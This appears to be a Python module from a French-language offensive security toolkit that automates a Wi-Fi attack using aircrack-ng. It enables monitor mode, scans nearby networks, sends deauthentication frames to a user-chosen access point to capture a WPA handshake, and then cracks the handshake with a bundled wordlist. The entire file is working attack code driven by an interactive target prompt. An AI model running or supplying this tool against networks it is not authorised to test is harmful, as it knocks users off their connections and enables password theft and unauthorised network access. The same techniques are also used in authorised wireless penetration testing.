# -*- coding: utf-8 -*-
# Module 9 : wifi scan + deauth + handshake
import subprocess, os, time, shutil

class WiFiAttacker:
    def __init__(self, iface):
        self.iface = iface

    def check_tools(self):
        return [t for t in ["airmon-ng","airodump-ng","aireplay-ng","aircrack-ng"]
                if shutil.which(t) is None]

    def enable_monitor(self):
        subprocess.run(["airmon-ng","start",self.iface],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return self.iface + "mon"

    def scan(self, mon, duration=15):
        os.makedirs("output", exist_ok=True)
        out_csv = "output/wifi_scan"
        p = subprocess.Popen(["airodump-ng","--output-format","csv",
                              "-w",out_csv,mon],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(duration); p.terminate()
        return out_csv + "-01.csv"

    def capture_handshake(self, mon, bssid, ch, out):
        p = subprocess.Popen(["airodump-ng","-c",str(ch),"--bssid",bssid,
                              "-w",out,mon],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(5)
        subprocess.run(["aireplay-ng","--deauth","10","-a",bssid,mon],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(20)
        p.terminate()
        return out + "-01.cap"

def run_interactive():
    from toolkit import ok, err, info, warn, section, ask, confirm
    section("ATTAQUE WI-FI")
    if os.name != "posix":
        err("Module Wi-Fi uniquement Linux"); return
    missing = WiFiAttacker("").check_tools()
    if missing:
        err(f"Outils manquants : {', '.join(missing)}")
        info("Installez : sudo apt install aircrack-ng"); return
    iface = ask("Interface Wi-Fi", "wlan0")
    wa = WiFiAttacker(iface)
    info("Passage en mode moniteur...")
    mon = wa.enable_monitor()
    info(f"Interface moniteur : {mon}")
    if confirm("Scanner les réseaux ?"):
        info("Scan de 15 secondes...")
        csv = wa.scan(mon, 15)
        if os.path.exists(csv):
            with open(csv, encoding="utf-8", errors="ignore") as f:
                for i,line in enumerate(f):
                    if i > 5 and line.strip() and line[0] != "Station":
                        parts = line.split(",")
                        if len(parts) > 13:
                            bssid = parts[0].strip()
                            ch = parts[3].strip()
                            essid = parts[13].strip()
                            if bssid and essid:
                                print(f"  {bssid}  CH:{ch:<3}  {essid}")
    bssid = ask("BSSID à attaquer (vide=stop)")
    if not bssid: return
    ch = int(ask("Canal", "6"))
    info("Capture + deauth (25s)...")
    cap = wa.capture_handshake(mon, bssid, ch, "output/handshake")
    if os.path.exists(cap):
        ok(f"Capture : {cap}")
        if confirm("Lancer aircrack-ng ?"):
            subprocess.run(["aircrack-ng", cap, "-w", "payloads/wordlist_pass.txt"])